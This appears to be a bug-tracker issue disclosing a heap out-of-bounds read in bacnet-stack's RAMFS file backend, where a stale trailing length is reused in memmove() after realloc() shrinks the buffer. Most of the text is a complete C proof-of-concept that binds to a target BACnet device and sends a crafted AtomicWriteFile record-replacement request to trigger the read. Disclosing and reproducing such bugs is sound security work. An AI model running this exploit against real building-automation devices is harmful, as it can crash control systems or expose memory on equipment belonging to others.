issue #1400

Summary

In bacnet-stack 1.5.0 (master branch commit 932e347), the RAMFS-backed FILE implementation accepts AtomicWriteFile(record-access) requests that replace existing records with caller-controlled content. If a client replaces a record with shorter data, the backend can shrink the heap allocation and then continue processing with a trailing-copy length derived from the old layout.

During that replace path, the RAMFS backend computes the trailing-copy length from the old file layout, then shrinks the heap allocation, and finally uses the stale length in memmove(). As a result, the source range of that memmove() can extend beyond the end of the reallocated heap buffer, producing a heap out-of-bounds read.

Relevant logic:

The normal BACnet request path for a record write is:
handler_atomic_write_file_encode()
  -> bacfile_write_record_data()
    -> bacfile_write_record_data_callback()
      -> bacfile_ramfs_write_record_data()
In bacfile_ramfs_write_record_data(), when an existing record is replaced, the backend first locates the old record and computes:
record_len = bacnet_strnlen(record, MAX_OCTET_STRING_BYTES);
tail_record_len = pFile->size - (record - pFile->data) - record_len;
It then shrinks or grows the backing allocation to fit the new record:
record = realloc(
    pFile->data, pFile->size - record_len + fileDataStrLen + 1);
After the realloc(), it re-finds the record pointer and shifts the remaining records:
memmove(record + fileDataStrLen, record + record_len, tail_record_len);
If the replacement record is shorter than the original one, the new heap allocation becomes smaller than the old file layout, but tail_record_len still reflects the pre-reallocation size.
In that case, the memmove() source interval can run past the end of the resized heap block.
The resulting bug is a heap out-of-bounds read in the RAMFS record-replacement path.

PoC

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

/* BACnet Stack defines - first */
#include "bacnet/bacdef.h"

/* BACnet Stack API */
#include "bacnet/apdu.h"
#include "bacnet/awf.h"
#include "bacnet/npdu.h"

/* basic services / client helpers */
#include "bacnet/basic/binding/address.h"
#include "bacnet/basic/npdu/h_npdu.h"
#include "bacnet/basic/service/h_apdu.h"
#include "bacnet/basic/service/h_iam.h"
#include "bacnet/basic/service/s_whois.h"
#include "bacnet/basic/tsm/tsm.h"
#include "bacnet/datalink/datalink.h"
#include "bacnet/datalink/dlenv.h"

static uint8_t Rx_Buf[MAX_MPDU] = { 0 };
static uint32_t Target_Device_Instance = BACNET_MAX_INSTANCE;
static uint32_t Target_File_Instance = 1;
static BACNET_ADDRESS Target_Address;
static uint8_t Request_Invoke_ID = 0;
static bool AWF_Acked = false;

static void AckHandler(BACNET_ADDRESS *src, uint8_t invoke_id)
{
    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
        AWF_Acked = true;
    }
}

static void InitHandlers(void)
{
    apdu_set_unconfirmed_handler(SERVICE_UNCONFIRMED_I_AM, handler_i_am_bind);
    apdu_set_confirmed_simple_ack_handler(
        SERVICE_CONFIRMED_ATOMIC_WRITE_FILE, AckHandler);
}

static uint8_t SendRecordReplace(
    uint32_t device_id,
    uint32_t file_instance,
    int32_t file_start_record,
    const uint8_t *record_data,
    size_t record_len)
{
    BACNET_ADDRESS dest = { 0 };
    BACNET_ADDRESS my_address = { 0 };
    BACNET_NPDU_DATA npdu_data = { 0 };
    BACNET_ATOMIC_WRITE_FILE_DATA data = { 0 };
    unsigned max_apdu = 0;
    bool found = false;
    uint8_t invoke_id = 0;
    int pdu_len = 0;
    int len = 0;
    int bytes_sent = 0;

    found = address_get_by_device(device_id, &max_apdu, &dest);
    if (found) {
        invoke_id = tsm_next_free_invokeID();
    }
    if (!invoke_id) {
        return 0;
    }

    data.object_type = OBJECT_FILE;
    data.object_instance = file_instance;
    data.access = FILE_RECORD_ACCESS;
    data.type.record.fileStartRecord = file_start_record;
    data.type.record.returnedRecordCount = 1;
    if (!octetstring_init(&data.fileData[0], record_data, record_len)) {
        tsm_free_invoke_id(invoke_id);
        return 0;
    }

    datalink_get_my_address(&my_address);
    npdu_encode_npdu_data(&npdu_data, true, MESSAGE_PRIORITY_NORMAL);
    pdu_len = npdu_encode_pdu(
        &Handler_Transmit_Buffer[0], &dest, &my_address, &npdu_data);

    len = awf_encode_apdu(&Handler_Transmit_Buffer[pdu_len], invoke_id, &data);
    pdu_len += len;

    if ((unsigned)pdu_len > max_apdu) {
        tsm_free_invoke_id(invoke_id);
        return 0;
    }

    tsm_set_confirmed_unsegmented_transaction(
        invoke_id, &dest, &npdu_data, &Handler_Transmit_Buffer[0],
        (uint16_t)pdu_len);
    bytes_sent =
        datalink_send_pdu(&dest, &npdu_data, &Handler_Transmit_Buffer[0], pdu_len);
    if (bytes_sent <= 0) {
        tsm_free_invoke_id(invoke_id);
        return 0;
    }

    return invoke_id;
}

static void Pump(time_t *last_seconds)
{
    BACNET_ADDRESS src = { 0 };
    uint16_t pdu_len = 0;
    time_t current_seconds = 0;

    pdu_len = datalink_receive(&src, &Rx_Buf[0], MAX_MPDU, 100);
    if (pdu_len) {
        npdu_handler(&src, &Rx_Buf[0], pdu_len);
    }
    current_seconds = time(NULL);
    if (current_seconds != *last_seconds) {
        tsm_timer_milliseconds((uint16_t)((current_seconds - *last_seconds) * 1000));
        datalink_maintenance_timer((uint16_t)(current_seconds - *last_seconds));
        *last_seconds = current_seconds;
    }
}

int main(int argc, char *argv[])
{
    unsigned max_apdu = 0;
    time_t last_seconds = 0;
    time_t deadline = 0;
    static const uint8_t short_record[] = "B";

    if (argc < 3) {
        fprintf(stderr, "usage: %s <device-instance> <file-instance>\n", argv[0]);
        fprintf(stderr, "example: %s 260001 1\n", argv[0]);
        return 1;
    }

    Target_Device_Instance = strtoul(argv[1], NULL, 0);
    Target_File_Instance = strtoul(argv[2], NULL, 0);

    address_init();
    InitHandlers();
    dlenv_init();
    atexit(datalink_cleanup);

    last_seconds = time(NULL);
    Send_WhoIs(Target_Device_Instance, Target_Device_Instance);
    deadline = time(NULL) + 10;
    while ((time(NULL) < deadline) &&
           !address_bind_request(
               Target_Device_Instance, &max_apdu, &Target_Address)) {
        Pump(&last_seconds);
    }
    if (!address_bind_request(Target_Device_Instance, &max_apdu, &Target_Address)) {
        fprintf(stderr, "[-] bind target failed\n");
        return 1;
    }
    printf("[+] bound target\n");

    Request_Invoke_ID = SendRecordReplace(
        Target_Device_Instance, Target_File_Instance, 0, short_record,
        sizeof(short_record) - 1);
    if (!Request_Invoke_ID) {
        fprintf(stderr, "[-] failed to send AWF record replace\n");
        return 1;
    }
    printf("[*] sent AWF record replace\n");

    for (;;) {
        Pump(&last_seconds);
        if (AWF_Acked && tsm_invoke_id_free(Request_Invoke_ID)) {
            printf("[+] AWF ack\n");
            return 0;
        }
        if (tsm_invoke_id_failed(Request_Invoke_ID)) {
            fprintf(stderr, "[-] AWF request timed out\n");
            tsm_free_invoke_id(Request_Invoke_ID);
            return 1;
        }
    }
}

The PoC sends a single record-replacement request:

AtomicWriteFile(OBJECT_FILE, 1, FILE_RECORD_ACCESS, fileStartRecord = 0, returnedRecordCount = 1, fileData[0] = "B")
In the supplied reproduction environment described below, that request replaces a longer first record with the 1-byte record "B". The backend then shrinks the heap allocation but still uses the old trailing length when shifting the remaining records, which causes the out-of-bounds read.
